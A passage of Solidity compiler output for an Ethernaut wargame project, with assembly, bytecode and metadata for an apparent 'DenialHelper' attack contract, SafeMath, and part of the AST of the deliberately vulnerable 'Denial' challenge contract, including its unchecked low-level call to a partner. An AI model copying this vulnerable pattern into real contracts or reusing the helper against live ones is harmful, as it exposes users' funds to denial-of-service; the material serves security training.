											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 84,
											"end": 315,
											"name": "STOP",
											"source": 1
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"denialAddr\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Ethernaut/DenialHelper.sol\":\"DenialHelper\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ethernaut/Denial.sol\":{\"keccak256\":\"0x19248043f462d196626c1c83640f53d6f26212a8d2fc462abdfdaeb913cb964a\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://7d7be0f64c955a8625fd705e663e1c894b3fd2f69c224dc5f122a8576e739319\",\"dweb:/ipfs/Qmewr5UD5XgqZqCjUDaa9HYz43YT6RQzYDiDakjTCwH513\"]},\"contracts/Ethernaut/DenialHelper.sol\":{\"keccak256\":\"0x796ec480bc43fd9a83d94d587c39906cb7be4585e26a8a136509e4776ed957cd\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://073c66f2435aea7e7659a8b09631c3868a0cd425c2020017ef186a280d2f4d1e\",\"dweb:/ipfs/QmcNK3pwZ92rHtJFTLtihabJqEQ5GeCuJ7KFbboVzCYcB1\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0x9a9cf02622cd7a64261b10534fc3260449da25c98c9e96d1b4ae8110a20e5806\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://2df142592d1dc267d9549049ee3317fa190d2f87eaa565f86ab05ec83f7ab8f5\",\"dweb:/ipfs/QmSkJtcfWo7c42KnL5hho6GFxK6HRNV91XABx1P7xDtfLV\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 95,
								"contract": "contracts/Ethernaut/DenialHelper.sol:DenialHelper",
								"label": "denialInst",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(Denial)90"
							}
						],
						"types": {
							"t_contract(Denial)90": {
								"encoding": "inplace",
								"label": "contract Denial",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations with added overflow checks. Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.",
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":622:5200  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n  0x0b\n  dup3\n  dup3\n  dup3\n  codecopy\n  dup1\n  mload\n  0x00\n  byte\n  0x73\n  eq\n  tag_1\n  jumpi\n  invalid\ntag_1:\n  mstore(0x00, address)\n  0x73\n  dup2\n  mstore8\n  dup3\n  dup2\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":622:5200  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa2646970667358221220e64891e8457a5724628a9071ecd15aac5fa08960b7c95501be23a765fd88bd4e64736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220e64891e8457a5724628a9071ecd15aac5fa08960b7c95501be23a765fd88bd4e64736f6c634300060c0033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE6 0x48 SWAP2 0xE8 GASLIMIT PUSH27 0x5724628A9071ECD15AAC5FA08960B7C95501BE23A765FD88BD4E64 PUSH20 0x6F6C634300060C00330000000000000000000000 ",
							"sourceMap": "622:4578:2:-:0;;;;;;;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220e64891e8457a5724628a9071ecd15aac5fa08960b7c95501be23a765fd88bd4e64736f6c634300060c0033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE6 0x48 SWAP2 0xE8 GASLIMIT PUSH27 0x5724628A9071ECD15AAC5FA08960B7C95501BE23A765FD88BD4E64 PUSH20 0x6F6C634300060C00330000000000000000000000 ",
							"sourceMap": "622:4578:2:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
								"div(uint256,uint256,string memory)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mod(uint256,uint256,string memory)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite",
								"sub(uint256,uint256,string memory)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 622,
									"end": 5200,
									"name": "PUSH #[$]",
									"source": 2,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "PUSH [$]",
									"source": 2,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "PUSH",
									"source": 2,
									"value": "B"
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "CODECOPY",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "BYTE",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "PUSH",
									"source": 2,
									"value": "73"
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "1"
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "INVALID",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "tag",
									"source": 2,
									"value": "1"
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "ADDRESS",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "MSTORE",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "PUSH",
									"source": 2,
									"value": "73"
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "MSTORE8",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5200,
									"name": "RETURN",
									"source": 2
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220e64891e8457a5724628a9071ecd15aac5fa08960b7c95501be23a765fd88bd4e64736f6c634300060c0033",
									".code": [
										{
											"begin": 622,
											"end": 5200,
											"name": "PUSHDEPLOYADDRESS",
											"source": 2
										},
										{
											"begin": 622,
											"end": 5200,
											"name": "ADDRESS",
											"source": 2
										},
										{
											"begin": 622,
											"end": 5200,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 622,
											"end": 5200,
											"name": "PUSH",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 622,
											"end": 5200,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 622,
											"end": 5200,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 622,
											"end": 5200,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 622,
											"end": 5200,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 622,
											"end": 5200,
											"name": "REVERT",
											"source": 2
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations with added overflow checks. Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0x9a9cf02622cd7a64261b10534fc3260449da25c98c9e96d1b4ae8110a20e5806\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://2df142592d1dc267d9549049ee3317fa190d2f87eaa565f86ab05ec83f7ab8f5\",\"dweb:/ipfs/QmSkJtcfWo7c42KnL5hho6GFxK6HRNV91XABx1P7xDtfLV\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "contracts/Ethernaut/Denial.sol:23:9: Warning: Return value of low-level calls not used.\n        partner.call{value:amountToSend}(\"\");\n        ^----------------------------------^\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 909,
					"file": "contracts/Ethernaut/Denial.sol",
					"start": 873
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/Ethernaut/Denial.sol": {
				"ast": {
					"absolutePath": "contracts/Ethernaut/Denial.sol",
					"exportedSymbols": {
						"Denial": [
							90
						]
					},
					"id": 91,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol",
							"file": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 91,
							"sourceUnit": 314,
							"src": "60:112:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 90,
							"linearizedBaseContracts": [
								90
							],
							"name": "Denial",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 5,
									"libraryName": {
										"contractScope": null,
										"id": 3,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 313,
										"src": "207:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$313",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "201:27:0",
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "220:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"functionSelector": "be10862b",
									"id": 7,
									"mutability": "mutable",
									"name": "partner",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 90,
									"src": "234:22:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 6,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "234:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": true,
									"functionSelector": "8da5cb5b",
									"id": 13,
									"mutability": "constant",
									"name": "owner",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 90,
									"src": "319:54:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address_payable",
										"typeString": "address payable"
									},
									"typeName": {
										"id": 8,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "319:15:0",
										"stateMutability": "payable",
										"typeDescriptions": {
											"typeIdentifier": "t_address_payable",
											"typeString": "address payable"
										}
									},
									"value": {
										"argumentTypes": null,
										"arguments": [
											{
												"argumentTypes": null,
												"hexValue": "3078413945",
												"id": 11,
												"isConstant": false,
												"isLValue": false,
												"isPure": true,
												"kind": "number",
												"lValueRequested": false,
												"nodeType": "Literal",
												"src": "367:5:0",
												"subdenomination": null,
												"typeDescriptions": {
													"typeIdentifier": "t_rational_2718_by_1",
													"typeString": "int_const 2718"
												},
												"value": "0xA9E"
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_rational_2718_by_1",
													"typeString": "int_const 2718"
												}
											],
											"id": 10,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"lValueRequested": false,
											"nodeType": "ElementaryTypeNameExpression",
											"src": "359:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_address_$",
												"typeString": "type(address)"
											},
											"typeName": {
												"id": 9,
												"name": "address",
												"nodeType": "ElementaryTypeName",
												"src": "359:7:0",
												"typeDescriptions": {
													"typeIdentifier": null,
													"typeString": null
												}
											}
										},
										"id": 12,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "typeConversion",
										"lValueRequested": false,
										"names": [],
										"nodeType": "FunctionCall",
										"src": "359:14:0",
										"tryCall": false,
										"typeDescriptions": {
											"typeIdentifier": "t_address_payable",
											"typeString": "address payable"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 15,
									"mutability": "mutable",
									"name": "timeLastWithdrawn",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 90,
									"src": "380:22:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 14,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "380:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 19,
									"mutability": "mutable",
									"name": "withdrawPartnerBalances",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 90,
									"src": "409:48:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 18,
										"keyType": {
											"id": 16,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "417:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "409:24:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 17,
											"name": "uint",
											"nodeType": "ElementaryTypeName",
											"src": "428:4:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 28,
										"nodeType": "Block",
										"src": "554:37:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 26,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 24,
														"name": "partner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 7,
														"src": "565:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 25,
														"name": "_partner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 21,
														"src": "575:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "565:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 27,
												"nodeType": "ExpressionStatement",
												"src": "565:18:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "4e1c5914",
									"id": 29,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "setWithdrawPartner",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 21,
												"mutability": "mutable",
												"name": "_partner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 29,
												"src": "529:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 20,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "529:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "528:18:0"
									},
									"returnParameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "554:0:0"
									},
									"scope": 90,
									"src": "501:90:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 72,
										"nodeType": "Block",
										"src": "675:458:0",
										"statements": [
											{
												"assignments": [
													33
												],
												"declarations": [
													{
														"constant": false,
														"id": 33,
														"mutability": "mutable",
														"name": "amountToSend",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 72,
														"src": "686:17:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 32,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "686:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 42,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "313030",
															"id": 40,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "732:3:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_100_by_1",
																"typeString": "int_const 100"
															},
															"value": "100"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_rational_100_by_1",
																"typeString": "int_const 100"
															}
														],
														"expression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 36,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "714:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_Denial_$90",
																			"typeString": "contract Denial"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_Denial_$90",
																			"typeString": "contract Denial"
																		}
																	],
																	"id": 35,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "706:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 34,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "706:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 37,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "706:13:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 38,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "706:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 39,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "div",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 243,
														"src": "706:25:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 41,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "706:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "686:50:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "",
															"id": 48,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "906:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"typeString": "literal_string \"\""
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 43,
																"name": "partner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 7,
																"src": "873:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 45,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "873:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 47,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"argumentTypes": null,
																"id": 46,
																"name": "amountToSend",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 33,
